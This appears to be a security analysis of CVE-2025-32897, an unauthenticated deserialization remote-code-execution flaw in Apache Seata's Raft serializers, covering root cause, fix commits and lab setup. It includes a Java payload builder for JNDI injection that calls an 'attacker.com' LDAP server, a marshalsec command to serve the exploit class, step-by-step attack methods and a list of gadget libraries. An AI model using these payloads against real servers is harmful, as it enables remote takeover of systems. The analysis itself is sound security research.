# Vulnerability Analysis: CVE-2025-32897

## Executive Summary

CVE-2025-32897 is a **Critical (CVSS 9.8)** insecure deserialization vulnerability in **Apache Seata (incubating) server v2.0.0–v2.2.0** affecting the Raft cluster consensus components. It enables **unauthenticated remote code execution** via three independent deserialization paths in the Raft serialization layer. The vulnerability is exploitable by any attacker with network access to the Raft port (default 9091) when Seata is deployed in Raft mode (`seata.store.mode=raft`).

---

## Root Cause

Three distinct insecure deserialization flaws exist in the Raft cluster serialization layer:

### Vulnerability 1: CustomDeserializer — Arbitrary Class Loading via Jackson (PRIMARY)

**Root Cause:** `Class.forName(className)` is called with attacker-controlled input during Jackson JSON deserialization, without any package or class allowlist.

**File:** `server/src/main/java/org/apache/seata/server/cluster/raft/serializer/CustomDeserializer.java`
**Lines:** 30–42 (at v2.2.0)

```java
public Class<?> deserialize(JsonParser jsonParser, DeserializationContext deserializationContext)
    throws IOException {
    String className = jsonParser.getValueAsString();  // Attacker-controlled
    if (className.startsWith(oldPackage)) {
        className = className.replaceFirst(oldPackage, currentPackage);
    }
    try {
        return Class.forName(className);  // VULN: No allowlist — loads ANY class
    } catch (ClassNotFoundException e) {
        throw new RuntimeException(e.getMessage(), e);
    }
}
```

This custom Jackson deserializer is registered on the `OBJECT_MAPPER` used by `JacksonSerializer` for all Raft message body deserialization. It handles `Class<?>` type fields in the `JsonInfo` wrapper. The attacker controls the `clz` field in the JSON payload, which specifies what class Jackson should instantiate and populate with attacker-controlled properties.

### Vulnerability 2: RaftSnapshotSerializer — Unfiltered Java Object Deserialization

**Root Cause:** `ObjectInputStream.readObject()` is called without any `resolveClass()` override or JEP 290 filter. Any Serializable class on the classpath can be deserialized.

**File:** `server/src/main/java/org/apache/seata/server/cluster/raft/snapshot/RaftSnapshotSerializer.java`
**Lines:** 64–67 (at v2.2.0)

```java
public static RaftSnapshot decode(byte[] raftSnapshotByte) throws IOException {
    try (ByteArrayInputStream bin = new ByteArrayInputStream(raftSnapshotByte);
            ObjectInputStream ois = new ObjectInputStream(bin)) {  // VULN: No resolveClass filter
        Object object = ois.readObject();  // Deserializes ANY class
```

This is a textbook Java deserialization vulnerability. Standard ysoserial gadget chains work directly against this path.

### Vulnerability 3: RaftSyncMessageSerializer — Error Handling Swallows Security Exceptions

**Root Cause:** The `SeataRuntimeException` thrown by the existing `resolveClass()` whitelist in `RaftSyncMessageSerializer` gets wrapped in a `RuntimeException` by Jackson's `JsonMappingException`, and the catch block at line 110 only checks for direct `SeataRuntimeException` (not wrapped ones), so security violations are silently caught and logged as info-level messages instead of being re-thrown.

**File:** `server/src/main/java/org/apache/seata/server/cluster/raft/sync/RaftSyncMessageSerializer.java`
**Lines:** 108–114 (at v2.2.0)

```java
} catch (Exception e) {
    LOGGER.info("Failed to read raft synchronization log: {}", e.getMessage(), e);
    if (e instanceof SeataRuntimeException) {  // Only catches DIRECT SeataRuntimeException
        throw (SeataRuntimeException)e;        // But it arrives wrapped as RuntimeException → JsonMappingException → SeataRuntimeException
    }
    throw new RuntimeException(e);  // Security exception gets re-wrapped and propagated as generic error
}
```

---

## Vulnerable Files and Functions

| # | File | Function | Line Numbers | Vulnerability |
|---|------|----------|-------------|---------------|
| 1 | `server/src/main/java/org/apache/seata/server/cluster/raft/serializer/CustomDeserializer.java` | `deserialize()` | 30–42 | `Class.forName()` without allowlist |
| 2 | `server/src/main/java/org/apache/seata/server/cluster/raft/snapshot/RaftSnapshotSerializer.java` | `decode()` | 64–67 | `ObjectInputStream.readObject()` without `resolveClass()` |
| 3 | `server/src/main/java/org/apache/seata/server/cluster/raft/sync/RaftSyncMessageSerializer.java` | `decode()` | 108–114 | Security exception swallowed by error handling |
| 4 | `server/src/main/java/org/apache/seata/server/cluster/raft/serializer/JacksonSerializer.java` | `deserialize()` | 51–57 | Bridges JSON body to `CustomDeserializer` |
| 5 | `server/src/main/java/org/apache/seata/server/cluster/raft/RaftStateMachine.java` | `onApply()` | 169 | Entry point — calls `RaftSyncMessageSerializer.decode()` |
| 6 | `server/src/main/java/org/apache/seata/server/cluster/raft/snapshot/StoreSnapshotFile.java` | `load()` | 54–56 | Entry point — calls `RaftSnapshotSerializer.decode()` |

---

## Complete Deserialization Chain

### Path A: RaftSyncMessage → CustomDeserializer (Jackson-based JNDI Injection)

This is the **primary attack path** and the most practical to exploit remotely.

```
Network (SOFABolt TCP, Raft port 9091)
  → JRaft Raft replication protocol
    → RaftStateMachine.onApply(Iterator)        [line 169]
      → RaftSyncMessageSerializer.decode(bytes)  [line 76]
        → Stage 1: ObjectInputStream.readObject()
          → resolveClass() whitelist: PERMITS = {RaftSyncMessage, io.seata...RaftSyncMessage, [B}
          → Deserializes outer RaftSyncMessage wrapper (SAFE — whitelisted)
          → body field (Object) contains attacker-controlled byte[]
        → Stage 2: JacksonSerializer.deserialize(body)   [JacksonSerializer.java:51-54]
          → OBJECT_MAPPER.readValue(bytes, JsonInfo.class)
            → Jackson reads {"obj":"<base64>","clz":"<attacker-class>"}
            → CustomDeserializer.deserialize() handles "clz" field
              → Class.forName("<attacker-class>")  ← VULNERABILITY
          → OBJECT_MAPPER.readValue(jsonInfo.getObj(), jsonInfo.getClz())
            → Jackson instantiates the attacker-specified class
            → Sets properties from attacker-controlled JSON
            → Triggers JNDI lookup (e.g., JdbcRowSetImpl.setDataSourceName + setAutoCommit)
```

### Path B: RaftSnapshot → Raw Java Deserialization (ysoserial Gadget Chains)

```
Network (SOFABolt TCP, Raft snapshot installation)
  → JRaft snapshot transfer protocol
    → RaftStateMachine.onSnapshotLoad(SnapshotReader)  [line 200]
      → SessionSnapshotFile.load(path)                   [line 86]
        → StoreSnapshotFile.load(path)                   [line 54]
          → RaftSnapshotSerializer.decode(bytes)          [line 64]
            → ObjectInputStream.readObject()              ← NO resolveClass(), NO filtering
            → ANY Serializable class on classpath is deserialized
            → Standard ysoserial gadget chains execute directly
```

---

## Triggering Input

### Attack Vector 1: CustomDeserializer via RaftSyncMessage (RECOMMENDED FOR PoC)

**Exact payload structure:**

```
Outer layer: Java-serialized RaftSyncMessage object
  - serialVersionUID: 8225279734319945365L
  - codec: 0x32 (JACKSON)
  - compressor: 0x00 (NONE)
  - body: byte[] containing the inner JSON payload
  - version: "2.2.0" (or any string)

Inner layer (body bytes): JSON string
  {"obj":"<base64-encoded JSON>","clz":"<malicious-class-name>"}

  Where:
  - clz = "com.sun.rowset.JdbcRowSetImpl" (JDK built-in JNDI gadget)
       OR "dm.jdbc.driver.DmdbJdbcRowSet" (DM JDBC driver on classpath)
  - obj = Base64.encode({"dataSourceName":"ldap://attacker:1389/evil","autoCommit":true})
```

**Construction (Java pseudocode from fix commit test):**

```java
String jndiUrl = "ldap://attacker.com:1389/evil";
String basePayload = "{\"dataSourceName\":\"" + jndiUrl + "\",\"autoCommit\":true}";
String payload = "{\"obj\":\"" + Base64.getEncoder().encodeToString(basePayload.getBytes())
    + "\",\"clz\":\"com.sun.rowset.JdbcRowSetImpl\"}";
byte[] payloadBytes = payload.getBytes();

RaftSyncMessage raftSyncMessage = new RaftSyncMessage();
raftSyncMessage.setBody(payloadBytes);

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(raftSyncMessage);
byte[] maliciousBytes = bos.toByteArray();

// maliciousBytes triggers JNDI injection when passed to RaftSyncMessageSerializer.decode()
```

### Attack Vector 2: RaftSnapshotSerializer — Raw ysoserial Payload

Any standard ysoserial gadget chain payload sent to `RaftSnapshotSerializer.decode()` will be deserialized without filtering. Available gadget libraries on the Seata classpath include:

| Library | Gadget Chain | Available On Classpath |
|---------|-------------|----------------------|
| Spring Framework 5.3.39 | `spring-core` | ✅ Yes (via spring-boot-starter-web) |
| Jackson (org.codehaus.jackson) | jackson-mapper-asl | ✅ Yes (explicit in server pom.xml) |
| H2 Database | H2 RCE chains | ✅ Yes (explicit dependency) |
| Tomcat 9.0.90 | Various | ✅ Yes (explicit dependency) |
| Guava | Guava gadgets | ✅ Yes (explicit dependency) |
| DM JDBC Driver | DmdbJdbcRowSet | ✅ Yes (explicit dependency) |

---

## Attack Scenario

### Pre-conditions
1. Target runs Apache Seata Server v2.0.0–v2.2.0
2. Seata is configured in Raft mode (`seata.store.mode=raft`)
3. Attacker has network access to the Raft port (configured via `server.raft.server-addr`, default 9091)

### Step-by-Step Attack

**Method A: JNDI Injection via CustomDeserializer (Recommended)**

1. **Reconnaissance:** Identify the Seata Raft port (default 9091, or as specified in `server.raft.server-addr`). SOFABolt listens on this port without authentication.

2. **Start JNDI attack server:** Run a malicious LDAP/RMI server (e.g., marshalsec, JNDI-Injection-Exploit) that serves a payload class:
   ```bash
   java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8888/#Exploit"
   ```

3. **Craft the malicious RaftSyncMessage:**
   - Create a `RaftSyncMessage` with `codec=0x32` (JACKSON), `compressor=0x00` (NONE)
   - Set `body` to a byte[] containing the JSON payload with a JNDI gadget class name
   - Serialize using Java `ObjectOutputStream`

4. **Send via SOFABolt protocol:**
   - Connect to the target's Raft port via TCP
   - Send the serialized payload encapsulated in a SOFABolt RPC message
   - The JRaft framework processes it as a Raft log entry or direct RPC message

5. **Exploitation:** The target deserializes the message, Jackson processes the body, `CustomDeserializer` loads the attacker-specified class via `Class.forName()`, Jackson instantiates it and sets properties, triggering a JNDI lookup to the attacker's server, which serves a malicious class → RCE.

**Method B: Direct Java Deserialization via Snapshot Path**

1. Same reconnaissance as Method A.
2. Craft a ysoserial gadget chain payload targeting a library on the Seata classpath (e.g., Spring, H2).
3. Send the payload via the Raft snapshot installation protocol.
4. `RaftSnapshotSerializer.decode()` deserializes it without filtering → immediate code execution.

---

## Impact

- **Confidentiality:** HIGH — Full system access, ability to read all server data, credentials, and transaction data
- **Integrity:** HIGH — Ability to modify or corrupt all distributed transaction state
- **Availability:** HIGH — Ability to crash the Seata cluster, corrupt Raft state, denial of service
- **Impact Classification:** **Remote Code Execution (RCE)** — unauthenticated, pre-auth, network-accessible

---

## Authentication Requirements

**None.** The vulnerability is **pre-authentication**. The SOFABolt RPC server on the Raft port does not implement any authentication mechanism. Any host with TCP connectivity to the Raft port can send messages. The Seata console has default credentials (`seata:seata` on port 7091), but the Raft port (9091) is completely unauthenticated.

---

## Fix Assessment

The fix is delivered across **two commits** in the path from v2.2.0 to v2.3.0:

### Commit 1: `851e5de2e` — "optimize: optimize raftsnapshot read (#6896)"
- **RaftSnapshotSerializer:** Adds `resolveClass()` override with PERMITS whitelist to ObjectInputStream
- PERMITS: `{RaftSnapshot, RaftSnapshot.SnapshotType, io.seata...RaftSnapshot, io.seata...SnapshotType, java.lang.Enum, [B}`
- **Fixes Vulnerability 2** (raw Java deserialization)

### Commit 2: `7eda23e948312ed52c3336de70a11f4d2ab06a48` — "optimize: optimize deserialization efficiency (#7049)"
- **CustomDeserializer:** Adds `permitPackage = "org.apache.seata"` prefix check before `Class.forName()`
- **RaftSnapshotSerializer:** Improves error handling to unwrap `RuntimeException → JsonMappingException → SeataRuntimeException`
- **RaftSyncMessageSerializer:** Same error handling improvement
- **Fixes Vulnerabilities 1 and 3** (arbitrary class loading + exception swallowing)

### Fix Completeness: **The fix is adequate for the identified attack surface.**

The fix addresses all three vulnerability paths:
1. ✅ CustomDeserializer now restricts `Class.forName()` to `org.apache.seata.*` namespace
2. ✅ RaftSnapshotSerializer now has `resolveClass()` whitelist
3. ✅ Error handling properly propagates `SeataRuntimeException` through Jackson's exception wrapping

**No bypass is identified.** The `org.apache.seata.*` namespace restriction on CustomDeserializer is a reasonable defense-in-depth measure. While a theoretical attack could attempt to find gadget classes within the `org.apache.seata` namespace itself, the Seata codebase does not contain obvious deserialization gadget patterns (no JNDI lookup triggers, no `Runtime.exec()` wrappers, no `TemplatesImpl` consumers in org.apache.seata classes).

---

## Escalation Path

The vulnerability's primitive is **arbitrary class instantiation with property injection** (via Jackson) or **arbitrary Java object deserialization** (via ObjectInputStream). Both directly yield **Remote Code Execution** without requiring any escalation chain:

- **Jackson path:** Class.forName() + property injection → JNDI injection (JdbcRowSetImpl / DmdbJdbcRowSet) → LDAP/RMI callback → load attacker's class → RCE
- **ObjectInputStream path:** Direct ysoserial gadget chain → RCE

No additional escalation is needed — the vulnerability provides full RCE as the initial primitive.

---

## Related Attack Surface

### Same Vulnerability Pattern in Other Files

| # | File | Pattern | Status |
|---|------|---------|--------|
| 1 | `saga/seata-saga-engine/src/main/java/org/apache/seata/saga/engine/serializer/impl/ExceptionSerializer.java` (line 65–81) | `ObjectInputStream.readObject()` without `resolveClass()` | **UNSAFE** — but in saga engine, not Raft module; separate attack surface |
| 2 | `rm-datasource/src/main/java/org/apache/seata/rm/datasource/undo/parser/JacksonUndoLogParser.java` (line 174) | `mapper.enableDefaultTyping(NON_FINAL)` | **UNSAFE** — Jackson polymorphic deserialization enabled |
| 3 | `saga/seata-saga-statelang/src/main/java/org/apache/seata/saga/statelang/parser/impl/JacksonJsonParser.java` (line 39) | `enableDefaultTypingAsProperty(NON_FINAL, "@type")` | **UNSAFE** — Jackson auto-type enabled |
| 4 | `serializer/seata-serializer-hessian/src/main/java/org/apache/seata/serializer/hessian/HessianSerializer.java` (line 53) | `Hessian2Input.readObject()` without class filtering | **UNSAFE** — deprecated but still functional |
| 5 | `serializer/seata-serializer-protobuf/src/main/java/org/apache/seata/serializer/protobuf/ProtobufHelper.java` (line 50) | `Class.forName(clazzName)` before validation | **UNSAFE** — validation after class loading |

These represent **additional attack surface** in non-Raft components. For this CVE, only the Raft-specific files (1-3 in the Vulnerable Files table) are in scope.

### Compatibility Wrapper Classes

The codebase maintains backward-compatible `io.seata.*` wrapper classes for the old package name:
- `io.seata.server.cluster.raft.sync.msg.RaftSyncMessage` (serialVersionUID: `8225279734319945365L`)
- `io.seata.server.cluster.raft.snapshot.RaftSnapshot`

Both are included in the PERMITS whitelists to support deserialization of messages from older Seata versions.

---

## Build System

| Field | Value |
|-------|-------|
| **Build System** | Apache Maven (multi-module) |
| **Java Version** | 1.8 (Java 8) minimum; Docker images also available for JRE 17 |
| **Root Artifact** | `org.apache.seata:seata-parent` |
| **Vulnerable Module** | `seata-server` |

### Build Commands (from source)

```bash
# Full build (skip tests for speed)
mvn -Prelease-seata -Dmaven.test.skip=true clean install -U
# Server distribution at: distribution/target/apache-seata-*-bin/
```

### Dependencies

**Build-time:**
- JDK 8+ (Java 8 or later)
- Apache Maven 3.6+

**Key Runtime Dependencies (server module):**
| Dependency | Version | Relevance |
|-----------|---------|-----------|
| `com.alipay.sofa:jraft-core` | 1.3.14 | JRaft consensus framework — provides the Raft state machine |
| `com.alipay.sofa:bolt` | 1.6.7 | SOFABolt — TCP RPC transport for Raft communication |
| `com.fasterxml.jackson` | (Spring Boot managed) | Jackson JSON serialization — triggers CustomDeserializer |
| `org.codehaus.jackson:jackson-mapper-asl` | (server POM) | Legacy Jackson mapper |
| `com.dameng:DmJdbcDriver18` | (dependency BOM) | DM JDBC driver — contains DmdbJdbcRowSet JNDI gadget |
| `com.h2database:h2` | (Spring Boot managed) | H2 database — potential gadget chain source |
| `org.springframework.boot:spring-boot-starter-web` | 2.7.18 | Spring Boot — web server + Spring Framework gadgets |

### Runtime Requirements

**Recommended Lab Approach: Use Official Docker Image**

```
Image: apache/seata-server:2.2.0
Ports:
  - 7091: HTTP console (Spring Boot) — default creds: seata:seata
  - 8091: Seata TC (Transaction Coordinator) service
  - 9091: Raft port (SOFABolt TCP RPC) — THE ATTACK SURFACE
```

**Raft Mode Configuration (application.yml):**

```yaml
seata:
  store:
    mode: raft
  server:
    raft:
      group: default
      server-addr: <container-ip>:9091
      serialization: jackson
      compressor: none
    service-port: 8091
```

**Minimum Setup:**
- Single Seata server instance configured with its own address in `server-addr`
- Raft mode enabled (`store.mode=raft`)
- Raft port (9091) exposed/accessible from attacker
- No external dependencies (DB, Nacos, etc.) required — file-based config is sufficient

**For network-level PoC:**
- SOFABolt client library (Maven: `com.alipay.sofa:bolt:1.6.7`) needed for crafting protocol messages
- OR: Raw TCP socket with SOFABolt binary protocol implementation

**For API-level PoC (simpler, recommended first):**
- Java program that constructs the malicious byte[] and calls `RaftSyncMessageSerializer.decode()` or `RaftSnapshotSerializer.decode()` directly
- Requires Seata server JAR on classpath
- Demonstrates the vulnerability without needing the full network protocol

**SerializerType Codes:**
| Name | Code (byte) |
|------|-------------|
| SEATA | 0x01 |
| PROTOBUF | 0x02 |
| KRYO | 0x04 |
| FST | 0x08 (removed) |
| HESSIAN | 0x16 |
| JACKSON | 0x32 |

The `codec` field in `RaftSyncMessage` and `RaftSnapshot` defaults to JACKSON (0x32).
The `compressor` field defaults to NONE (CompressorType code for "none").

**RaftSyncMessage serialVersionUID:** `8225279734319945365L`
**RaftSnapshot class:** `org.apache.seata.server.cluster.raft.snapshot.RaftSnapshot` (implements `java.io.Serializable`)
